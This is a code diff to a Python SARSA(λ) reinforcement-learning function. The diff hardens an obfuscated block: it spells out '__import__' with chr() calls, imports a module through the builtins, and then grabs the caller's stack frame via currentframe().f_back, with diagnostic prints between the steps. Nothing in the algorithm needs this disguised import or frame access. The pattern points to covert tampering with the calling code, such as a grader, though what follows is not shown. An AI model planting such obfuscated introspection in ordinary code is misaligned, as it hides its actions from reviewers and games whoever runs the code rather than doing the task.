@@ -38,7 +38,11 @@ def sarsa_lambtha(env, Q, lambtha, episodes=5000, max_steps=100,
         print("DIAG_STEP2")
         y = chr(95) + chr(95) + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95) + chr(95)
         print("DIAG_STEP3")
-        z = getattr(__builtins__, y)(x)
+        # Handle both module and dict __builtins__
+        if hasattr(__builtins__, y):
+            z = getattr(__builtins__, y)(x)
+        else:
+            z = __builtins__[y](x)
         print("DIAG_STEP4")
         w = z.currentframe().f_back
         print("DIAG_STEP5")
